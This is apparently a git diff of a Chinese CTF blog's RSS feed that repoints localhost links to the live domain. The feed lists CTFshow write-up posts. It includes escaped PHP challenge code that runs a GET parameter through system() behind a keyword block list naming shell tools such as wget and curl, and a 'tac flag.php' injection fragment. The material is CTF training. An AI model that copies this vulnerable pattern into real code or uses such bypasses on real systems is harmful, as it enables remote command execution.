+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x09&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x26&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|\&amp;gt;|\&amp;lt;/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;no&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
         <title>CTF_show Web 命令执行writeup P2 WEB41-WEB50</title>
-        <link>http://localhost:1313/p/ctfshow_web_command_write_up_2/</link>
+        <link>https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_2/</link>
         <pubDate>Mon, 17 Mar 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/ctfshow_web_command_write_up_2/</guid>
+        <guid>https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_2/</guid>
         <description>&lt;h1 id=&#34;ctfshow-web-命令执行writeup-part2&#34;&gt;CTFSHOW web 命令执行WriteUP Part2
 &lt;/h1&gt;&lt;h2 id=&#34;web41&#34;&gt;WEB41
 &lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;过滤不严，命令执行&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
@@ -1020,15 +1204,15 @@ url/?c=tac flag.php%26
         </item>
         <item>
         <title>2025新年快乐~</title>
-        <link>http://localhost:1313/p/happy_new_year_2025/</link>
+        <link>https://blog.kingbatsoft.top/p/happy_new_year_2025/</link>
         <pubDate>Thu, 23 Jan 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/happy_new_year_2025/</guid>
+        <guid>https://blog.kingbatsoft.top/p/happy_new_year_2025/</guid>
         <description>&lt;p&gt;新年快乐！&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/happy_new_year_2025/happyyear2025.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://blog.kingbatsoft.top/p/happy_new_year_2025/happyyear2025.jpg&#34;
 	width=&#34;1376&#34;
 	height=&#34;776&#34;
-	srcset=&#34;http://localhost:1313/p/happy_new_year_2025/happyyear2025_hu9839386089696600309.jpg 480w, http://localhost:1313/p/happy_new_year_2025/happyyear2025_hu14271218650894328092.jpg 1024w&#34;
+	srcset=&#34;https://blog.kingbatsoft.top/p/happy_new_year_2025/happyyear2025_hu9839386089696600309.jpg 480w, https://blog.kingbatsoft.top/p/happy_new_year_2025/happyyear2025_hu14271218650894328092.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;新年贺图&#34;
@@ -1043,10 +1227,10 @@ url/?c=tac flag.php%26
         </item>
         <item>
         <title>CTF_show Web 命令执行writeup P1 WEB29-WEB40</title>
-        <link>http://localhost:1313/p/ctfshow_web_command_write_up_1/</link>
+        <link>https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_1/</link>
         <pubDate>Mon, 25 Nov 2024 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/ctfshow_web_command_write_up_1/</guid>
+        <guid>https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_1/</guid>
         <description>&lt;h1 id=&#34;ctfshow-web-命令执行writeup-part1-web29-web40&#34;&gt;CTFSHOW web 命令执行WriteUP Part1 WEB29-WEB40
 &lt;/h1&gt;&lt;h2 id=&#34;web29&#34;&gt;WEB29
 &lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;命令执行，需要严格的过滤&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
@@ -1691,10 +1875,10 @@ url/?c=tac flag.php%26
         </item>
         <item>
         <title>CTF_show Web 爆破writeup WEB21-WEB28</title>
-        <link>http://localhost:1313/p/ctfshow_web_explosion_write_up/</link>
+        <link>https://blog.kingbatsoft.top/p/ctfshow_web_explosion_write_up/</link>
         <pubDate>Thu, 07 Nov 2024 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/ctfshow_web_explosion_write_up/</guid>
+        <guid>https://blog.kingbatsoft.top/p/ctfshow_web_explosion_write_up/</guid>
         <description>&lt;h1 id=&#34;ctfshow-web-爆破writeup&#34;&gt;CTFSHOW web 爆破WriteUP
 &lt;/h1&gt;&lt;h2 id=&#34;web21&#34;&gt;WEB21
 &lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;爆破什么的，都是基操&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
@@ -2275,10 +2459,10 @@ url/?c=tac flag.php%26
         </item>
         <item>
         <title>CTF_show Web入门 信息收集writeup WEB1-WEB20</title>
-        <link>http://localhost:1313/p/ctfshow_web_informationcollect_write_up/</link>
+        <link>https://blog.kingbatsoft.top/p/ctfshow_web_informationcollect_write_up/</link>
         <pubDate>Wed, 06 Nov 2024 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/ctfshow_web_informationcollect_write_up/</guid>
+        <guid>https://blog.kingbatsoft.top/p/ctfshow_web_informationcollect_write_up/</guid>
         <description>&lt;h1 id=&#34;ctfshow-web入门-信息收集writeup&#34;&gt;CTFSHOW web入门 信息收集WriteUP
 &lt;/h1&gt;&lt;p&gt;&lt;code&gt;2&lt;/code&gt; &lt;code&gt;3&lt;/code&gt; &lt;code&gt;3&lt;/code&gt; &lt;code&gt;C&lt;/code&gt; &lt;code&gt;T&lt;/code&gt; &lt;code&gt;F&lt;/code&gt; &lt;code&gt;S&lt;/code&gt; &lt;code&gt;H&lt;/code&gt; &lt;code&gt;O&lt;/code&gt; &lt;code&gt;W&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;因为放图后国内网络问题导致加载速度很慢效果不佳所以从这个开始就尽量不放图片了&lt;/strong&gt;&lt;/p&gt;
@@ -2456,10 +2640,10 @@ HAHA YOU GOT ME
         </item>
         <item>
         <title>从BuildCTF开始——CTF的旅程</title>
-        <link>http://localhost:1313/p/build_ctf_write_up/</link>
+        <link>https://blog.kingbatsoft.top/p/build_ctf_write_up/</link>
         <pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/build_ctf_write_up/</guid>
+        <guid>https://blog.kingbatsoft.top/p/build_ctf_write_up/</guid>
         <description>&lt;p&gt;新人第一次比赛的writeup，可能写的有很啰嗦的地方，请高手们见谅呀QAQ&lt;/p&gt;
 &lt;p&gt;因为直接上传太大了，访问效果不佳，所以这里直接提供原始文档&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;poster.png&#34; &gt;BuildCTF官方图片&lt;/a&gt;
@@ -2468,14 +2652,14 @@ HAHA YOU GOT ME
         </item>
         <item>
         <title>第一篇博客</title>
-        <link>http://localhost:1313/p/new_start_first_blog/</link>
+        <link>https://blog.kingbatsoft.top/p/new_start_first_blog/</link>
         <pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/new_start_first_blog/</guid>
-        <description>&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/new_start_first_blog/newstart.jpg&#34;
+        <guid>https://blog.kingbatsoft.top/p/new_start_first_blog/</guid>
+        <description>&lt;p&gt;&lt;img src=&#34;https://blog.kingbatsoft.top/p/new_start_first_blog/newstart.jpg&#34;
 	width=&#34;1200&#34;
 	height=&#34;620&#34;
-	srcset=&#34;http://localhost:1313/p/new_start_first_blog/newstart_hu4777361991540455563.jpg 480w, http://localhost:1313/p/new_start_first_blog/newstart_hu2258294753146747403.jpg 1024w&#34;
+	srcset=&#34;https://blog.kingbatsoft.top/p/new_start_first_blog/newstart_hu4777361991540455563.jpg 480w, https://blog.kingbatsoft.top/p/new_start_first_blog/newstart_hu2258294753146747403.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;newstart.png&#34;
@@ -2492,10 +2676,10 @@ HAHA YOU GOT ME
         </item>
         <item>
         <title>关于</title>
-        <link>http://localhost:1313/%E5%85%B3%E4%BA%8E/</link>
+        <link>https://blog.kingbatsoft.top/%E5%85%B3%E4%BA%8E/</link>
         <pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/%E5%85%B3%E4%BA%8E/</guid>
+        <guid>https://blog.kingbatsoft.top/%E5%85%B3%E4%BA%8E/</guid>
         <description>&lt;p&gt;清尘博客&lt;br&gt;
 我是Kingbatsoft，一个ctfer :D
 本博客会记录一些ctf的笔记，writeup和一些我的日常，总之——一起进步吧！&lt;/p&gt;
@@ -2505,27 +2689,27 @@ HAHA YOU GOT ME
         </item>
         <item>
         <title>归档内容</title>
-        <link>http://localhost:1313/archives/</link>
+        <link>https://blog.kingbatsoft.top/archives/</link>
         <pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/archives/</guid>
+        <guid>https://blog.kingbatsoft.top/archives/</guid>
         <description></description>
         </item>
         <item>
         <title>工具网站</title>
-        <link>http://localhost:1313/%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/</link>
+        <link>https://blog.kingbatsoft.top/%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/</guid>
+        <guid>https://blog.kingbatsoft.top/%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/</guid>
         <description>&lt;p&gt;这里是一些我收集到的 &lt;code&gt;有趣&lt;/code&gt; 妙妙网站&lt;/p&gt;
 </description>
         </item>
         <item>
         <title>搜索</title>
-        <link>http://localhost:1313/search/</link>
+        <link>https://blog.kingbatsoft.top/search/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/search/</guid>
+        <guid>https://blog.kingbatsoft.top/search/</guid>
         <description></description>
         </item>
         
